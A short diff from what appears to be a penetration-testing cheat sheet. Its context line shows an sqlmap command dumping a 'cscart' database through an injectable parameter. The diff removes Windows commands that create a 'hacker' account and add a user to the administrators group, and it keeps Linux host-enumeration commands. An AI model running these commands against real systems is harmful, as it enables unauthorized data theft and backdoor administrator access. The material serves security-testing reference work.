@@ -91,11 +91,6 @@ sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T
 ## PRIVILAGE ESCALATION
 
 
-
-Windows Commands:
-> net user hacker hacker /add 
-> net localgroup administrators IWAM_BOB /add
-
 Linux Commands:
 > cat /etc/issue
 > uname -a
